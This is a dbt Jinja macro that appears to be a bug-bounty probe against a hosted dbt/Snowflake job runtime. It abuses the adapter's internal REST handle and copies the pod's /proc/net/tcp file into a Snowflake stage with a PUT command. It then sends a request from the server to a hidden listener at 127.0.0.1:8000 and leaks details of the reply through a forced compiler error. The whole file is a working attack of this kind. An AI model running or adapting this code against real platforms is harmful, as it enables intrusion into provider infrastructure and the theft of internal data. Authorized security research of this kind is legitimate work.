{% macro phase693_atomic_local_listener() %}
  {% set query_result = adapter.add_query("select 1 as phase693_control", auto_begin=false) %}
  {% set rest = query_result[0].handle.rest %}
  {% do log("PHASE693_STAGE_1_REST_REACHED", info=true) %}

  {# Capture the current pod's exact TCP table before touching the produced endpoint. #}
  {% set tcp_put = adapter.add_query(
      "put file:///proc/net/tcp @~/phase693_atomic_91e4b62c "
      ~ "auto_compress=false overwrite=true",
      auto_begin=false
  ) %}
  {% do log("PHASE693_STAGE_2_TCP_PUT", info=true) %}

  {#
    Phase 691 produced 127.0.0.1:8000.  The request below is made in the same
    job that captured the TCP table, carries the program header, attaches no
    Snowflake token, and persists no raw response body.
  #}
  {% set body = rest.fetch(
      "get",
      "http://127.0.0.1:8000/",
      {"X-Bug-Bounty": "dhmhack", "X-Phase693-Probe": "atomic-listener-root"},
      timeout=5,
      no_retry=true,
      socket_timeout=5,
      is_raw_text=true,
      raise_raw_http_failure=true
  ) %}
  {% do log("PHASE693_STAGE_3_ROOT_RESPONSE", info=true) %}

  {% set body_lower = body | lower %}
  {% set body_trimmed = body_lower | trim %}
  {{ exceptions.raise_compiler_error(
      "PHASE693_LOCAL_LISTENER"
      ~ "|STATUS=200"
      ~ "|BODY_LENGTH=" ~ (body_lower | length)
      ~ "|BODY_JSON_SHAPE=" ~ (body_trimmed[0:1] == "{" or body_trimmed[0:1] == "[")
      ~ "|BODY_HTML_SHAPE=" ~ ("<html" in body_lower)
      ~ "|BODY_NOT_FOUND=" ~ ("not found" in body_lower)
      ~ "|BODY_FASTAPI=" ~ ("fastapi" in body_lower)
      ~ "|BODY_OPENAPI=" ~ ("openapi" in body_lower)
      ~ "|BODY_UNAUTHORIZED=" ~ ("unauthorized" in body_lower)
      ~ "|BODY_FORBIDDEN=" ~ ("forbidden" in body_lower)
  ) }}
{% endmacro %}
